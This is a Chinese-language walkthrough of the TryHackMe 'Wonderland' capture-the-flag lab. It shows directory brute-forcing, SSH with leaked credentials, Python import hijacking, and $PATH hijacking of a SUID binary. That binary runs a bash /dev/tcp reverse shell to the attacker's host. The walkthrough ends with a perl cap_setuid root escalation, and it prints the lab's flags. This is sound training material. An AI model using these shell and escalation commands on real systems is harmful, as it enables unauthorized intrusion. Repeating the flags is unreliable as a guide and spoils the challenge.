# Wonderland Writeup
> URL: https://tryhackme.com/dashboard

IP : 

## Recon
- 一直 nmap 太老梗太無聊了
	- 來玩玩新東西 `RustScan`
	- `wget https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb`
	- `sudo dpkg -i rustscan_2.0.1_amd64.deb`
- `rustscan -a 10.10.166.15`
	- ![](https://i.imgur.com/Gnkagw5.png)
	- 開 22 跟 80
## 網址
- http://10.10.166.15/
	- 透過 dirsearch 可以找到
		- `/r`
	- http://10.10.166.15/r/ 再掃，可以掃到
		- `/a`
		- ![](https://i.imgur.com/ynk4AVX.png)
	- 感覺每次都是一個字，所以可以爆搜看看，自己寫一個 python 腳本
		- ```python
			import requests
			from multiprocessing import Pool

			url = 'http://10.10.166.15/r/a/'
			alphabat = 'abcdefghijklmnopqrstuvwxyz'

			def req(i):
				res = requests.get(f'{url}/{i}')
				if res.status_code == 200:
					print(i)

			p = Pool(10)
			p.map(req,alphabat)  
			```
		- 如果爆到正確的就會 print 出來，然後手動把搜的結果加去 url 最後面再爆
			- 所以最後爆出的結果是`r/a/b/b/i/t`

- http://10.10.166.15/r/a/b/b/i/t/
	- ![](https://i.imgur.com/dZNYcX2.png)
	- 觀察原始碼會發現一串奇怪的字串
		- `alice:HowDothTheLittleCrocodileImproveHisShiningTail`
		- 斷詞後發現是 `How Doth The Little Crocodile Improve His Shining Tail`
		- 來自於
			- How Doth the Little Crocodile
			- 路易斯·卡羅創作的詩
			```
			How doth the little crocodile
			  Improve his shining tail
			And pour the waters of the Nile
			  On every golden scale!

			How cheerfully he seems to grin
			  How neatly spreads his claws,
			And welcomes little fishes in
			  With gently smiling jaws!
			```
		- 好...完全不重要
## SSH
- 通靈一下，我們時常會把帳號跟密碼用 `:` 隔開
	- 說不定，上面那串就是 alice 的密碼！嘗試ssh登入看看
		- `ssh alice@10.10.166.15`
			- 密碼 `HowDothTheLittleCrocodileImproveHisShiningTail`
		- ![](https://i.imgur.com/gjqdOYu.png)
- 到處找了一輪，都找不到 `user.txt` QAQ
	- 算了，我們直接想辦法提權，等有 root 後再用上帝視角來搜!
	- 但反而我們使用者`alice`的家目錄有一個沒有權限讀的 `root.txt`
	- ![](https://i.imgur.com/oOd2vhi.png)
- 輸入 `sudo -l` 觀察
	- ![](https://i.imgur.com/BjLRyHY.png)
	- 發現我們可以用 `rabbit` 使用者身分執行 `/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
	- 所以執行方法應該如下 `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
`
## 挾持 Python
- 觀察 `walrus_and_the_carpenter.py`
	- 發現內部的程式碼會 `import random`
	- 這個時候我們可以透過一些小技巧挾持他的 `random`
- Python 的 import 有一個特性
	- 首先他會讀取同一個資料夾裡面，是否有相同檔名的檔案來給他 Import
	- 再來才會去找 `sys.path` 裡面的東西
		- 可以輸入 `python3 -c "import sys; print(sys.path)"` 觀察
- 所以由於該檔案在我們家目錄，我們可以在自己家目錄下創一個 `random.py`
	- 此時如果執行該 python 檔案，即可使用我們自己的 random
	- 我們建造的 `random.py` 
		```python3
		import pty
		pty.spawn("/bin/bash")
		```
	- 以 `rabbit` 使用者執行看看
		- `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
		- 就會發現我們噴成 rabbit 的 shell 了!
			- ![](https://i.imgur.com/Oo40rbI.png)

## 逆向工程
- 進入 rabbit 後，發現他的家目錄有一個 `teaParty` 的檔案
	- 透過 `file teaParty` 檢查會發現他是一個 ELF 執行檔
		- ![](https://i.imgur.com/9qL5oDi.png)
	- 透過 `ls -al teaParty` 會發現他有 SUID
		- ![](https://i.imgur.com/SYqw5mF.png)
	- 那不管了，我們先執行看看ㄅ!
		- `./teaParty`
			- ![](https://i.imgur.com/Zc4fGaO.png)
			- 噴了一些字，還有當前時間就卡住了，感覺可以讓我輸入一些字，那就先隨便輸入個 `meow` 看看ㄅ
			- 哇...... 噴出了 `Segmentation fault (core dumped)`
				- ![](https://i.imgur.com/Eni6IZo.png)
				- 母...母湯阿，不會在這邊要開始打 `pwn` 了吧 QWQ
			- 好吧，那我們先把檔案抓出來分析看看
				- `cp teaParty /tmp`
				- `chmod 777 /tmp/teaParty`
				- 本機
					- `scp alice@10.10.166.15:/tmp/teaParty .`
- 透過 Cutter 打開
	- ![](https://i.imgur.com/5QJYvOD.png)
	- 觀察 `main` 函數會發現，先會 set `uid` 跟 `gid` 為 0x3eb = 1003
	- 先觀察一下 uid、gid 1003 是誰
		- `cat /etc/passwd | grep 1003`
		- ![](https://i.imgur.com/ZXCPLk5.png)
		- 會發現是一個叫做 `hatter` 的使用者
- 關於逆向這個程式，很明顯的重點就是以下三行
	- `setuid(0x3eb);`
	- `setgid(0x3eb);`
	- `system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");`
	- 然後他的 `Segmentation fault` 是假的
		- 7777777777777777777

- 我們可以發現他的 system 裡面主要 call 了兩個東西
	- 第一個是 `/bin/echo`
	- 第二個是 `date`
	- 在這邊我先查詢了 `/bin/echo` 以及 `/bin/date` 發現都不可以修改
- 想到我們可以做什麼事情了嗎?
	- 程式裡面的 `system` 呼叫的是 `date` 而不是 `/bin/date`
	- 而在 Linux 中，如果不寫完整的路徑，就會去`$PATH`裡面抓
	- 所以我們可以修改 `$PATH` ，增加路徑，並放上我們自己ㄉ `date` 檔案
		- 放一個 reverse shell
			- `/bin/bash -c '/bin/bash -i >& /dev/tcp/10.13.21.55/7877 0>&1'`
		- 再給他權限
			- `chmod +x date`
		- 攻擊機準備好 reverse shell
			- `nc -vlk 7877` 
		- 再輸入以下指令
			- `PATH=/home/rabbit:$PATH ./teaParty`
- 就可以收到 reverse shell 了!!
	- ![](https://i.imgur.com/ZZ9wpv0.png)
	- 我們目前到了 `hatter` 使用者
	- 在根目錄可以發現一組 `WhyIsARavenLikeAWritingDesk?` 密碼，可以以此用 ssh 登入 hatter
	- `ssh hatter@10.10.166.15`
## 提權
- 先透過 scp 把 linpeas 給傳到機器中
	- ![](https://i.imgur.com/2Qlr3yo.png)
- 輸入 `bash linpeas.sh`
	- 發現一些有趣的東西
- 在 `Capabilities` 的地方可以看到
	- Files with capabilities
		- ![](https://i.imgur.com/hPtNFxo.png)
		- 發現 perl 有 `cap_setuid`
		- 去 [GTFObins](https://gtfobins.github.io/)  上找 
- 就找到了 GTFObins 上面的 [perl Capabilities](https://gtfobins.github.io/gtfobins/perl/#capabilities)
	- `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
		- ![](https://i.imgur.com/bveY1BS.png)
		- 就發現了我們拿到 root !!
- 也就順利的拿到了 root 的 flag
	- ![](https://i.imgur.com/aSVKD2j.png)
	- `thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`
- 到 /root 看看有什麼東西
	- ![](https://i.imgur.com/HFeDVn0.png)
	- 找到了 `user.txt`
		- `thm{"Curiouser and curiouser!"}`
		- ~~把user.txt放在root目錄是不是搞錯了什麼~~